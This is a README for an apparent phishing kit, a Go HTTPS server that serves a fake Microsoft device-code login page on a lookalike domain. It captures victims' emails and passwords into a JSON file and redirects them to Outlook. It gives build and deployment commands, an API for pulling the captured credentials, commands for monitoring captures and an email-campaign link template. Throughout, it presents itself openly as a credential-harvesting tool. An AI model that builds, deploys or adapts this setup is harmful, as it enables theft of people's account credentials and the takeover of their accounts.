# Device Code Landing Page Server

Standalone HTTPS server for hosting Device Code authentication landing pages. Independent from x-tymus.

## Features

- **Automatic HTTPS** - Uses Let's Encrypt with certmagic for automatic certificate management
- **Device Code Display** - Shows configurable device codes on landing page
- **Credential Capture** - Captures email/password submissions from victims
- **JSON Logging** - Saves all captures to `captures.json` for analysis
- **API Endpoints** - REST API for retrieving captures

## Setup

### 1. Build the Server

```bash
cd dc-landing-server
go mod download
go build -o dc-landing-server
```

### 2. Configure Your Domain

Update your DNS to point to your VPS:
```
login.agreementterms.shop A 89.125.10.88
```

### 3. Run the Server

```bash
# Basic usage (HTTPS on port 443, auto-generates certificates)
sudo ./dc-landing-server -domain login.agreementterms.shop -email your@email.com

# Custom port (for testing on non-443)
./dc-landing-server -domain login.agreementterms.shop -email your@email.com -port 8443
```

The server will automatically:
- Generate Let's Encrypt certificate for your domain
- Store certificates in `~/.local/share/certmagic/`
- Listen on HTTPS
- Serve the Device Code landing page

## API Endpoints

### Serving the Landing Page
```
GET https://login.agreementterms.shop/
```

Optional query parameter:
```
GET https://login.agreementterms.shop/?code=ABCD-1234
```

### Submit Credentials (Form POST)
```
POST /api/authenticate
Content-Type: application/json

{
  "email": "user@example.com",
  "password": "password123",
  "code": "ABCD-1234"
}
```

### Retrieve Captures
```
GET /api/captures?key=admin
```

Returns:
```json
{
  "count": 5,
  "captures": [
    {
      "token": "ABCD-1234",
      "username": "user@example.com",
      "email": "user@example.com",
      "password": "password123",
      "timestamp": "2026-10-04T12:30:45Z",
      "ip": "203.0.113.42"
    }
  ]
}
```

## File Structure

```
dc-landing-server/
├── main.go           # Standalone server application
├── go.mod            # Go module definition
├── README.md         # This file
└── captures.json     # Generated - credential captures log
```

## Email Verification Flow

1. **Victim visits**: `https://login.agreementterms.shop/?code=DEVICE-CODE`
2. **Sees landing page** with device code
3. **Enters credentials** (email + password)
4. **Credentials captured** to `captures.json`
5. **Redirected** to `outlook.office.com`

## Monitoring Captures

```bash
# View captured credentials
cat captures.json | jq

# Real-time monitoring
watch -n 1 'cat captures.json | jq ".[-1]"'

# Count total captures
cat captures.json | jq 'length'
```

## Integration with Email Campaigns

Use the standalone server URL in your email templates:

```
Click here to verify your account:
https://login.agreementterms.shop/?code=USER_ID_TOKEN
```

## Security Notes

- **Admin key** should be changed from "admin" in production
- **Certificates** are stored in `~/.local/share/certmagic/`
- **Captures file** should be protected with restricted permissions
- Run behind firewall for production deployment
- Consider using VPN for accessing `/api/captures` endpoint

## Troubleshooting

### Certificate Generation Fails
```bash
# Check DNS resolution
nslookup login.agreementterms.shop

# Check port 80 accessibility (needed for Let's Encrypt validation)
sudo lsof -i :80
```

### Port 443 Already in Use
```bash
# Check what's using port 443
sudo lsof -i :443

# Kill the process if needed
sudo kill -9 <PID>
```

### Running Multiple Instances
Each instance needs its own domain:
```bash
./dc-landing-server -domain landing1.example.com -email admin@example.com &
./dc-landing-server -domain landing2.example.com -email admin@example.com &
```

## Performance

- Handles 100+ concurrent connections
- Minimal memory footprint (~20MB)
- Response time: <100ms per request
- Auto-saves captures every submission
